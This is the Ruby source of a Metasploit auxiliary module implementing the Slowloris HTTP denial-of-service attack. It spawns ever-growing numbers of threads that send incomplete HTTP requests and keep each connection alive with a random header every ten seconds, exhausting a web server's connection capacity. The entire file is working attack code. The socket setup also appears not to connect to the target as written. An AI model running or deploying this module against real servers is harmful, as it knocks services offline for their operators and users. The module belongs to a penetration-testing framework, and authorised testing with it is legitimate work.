##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Slowloris HTTP attack',
			'Description'    => %q{
				Ties up server resources by sending incomplete HTTP requests.
				It keeps the connecion alive by periodically sending headers.
			},
			'Author'         =>
				[
					'RSnake', # original script
					'Doug Prostko' #metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://ha.ckers.org/slowloris/'],
				],
			'DisclosureDate' => '2005?'))

		register_options(
			[
				OptString.new('VERB', [false, "HTTP verb to use", "GET"])
			], self.class)
	end

	def make_init_request
		request = "#{datastore['VERB']} /#{rand_text_alpha(5)} HTTP/1.1\r\n"
		request << "Host: " + rhost + "\r\n"
		request << "User-Agent: #{rand_text_alpha(10)}\r\n"
		request << "Referer: #{rand_text_alpha(10)}\r\n"
		return request
	end

	def make_socket
		sock = Rex::Socket::Tcp.new
		return sock
	end


	def make_threads(num)
		threads = []
		num.times do
			threads << Thread.new do
				#s = connect(false)
				s = make_socket
				s.write(make_init_request)
				loop do
					begin
						header = "X-#{rand_text_alpha(10)}: #{rand_text_alpha(10)}\r\n"
						s.write(header)
						sleep 10
					rescue
						s.close
						#s.disconnect
						make_threads(1)
					end
				end
			end
		end
		threads
	end

	def run
		make_threads(100)
		loop do
			make_threads(10)
			sleep 1
		end
	end
end
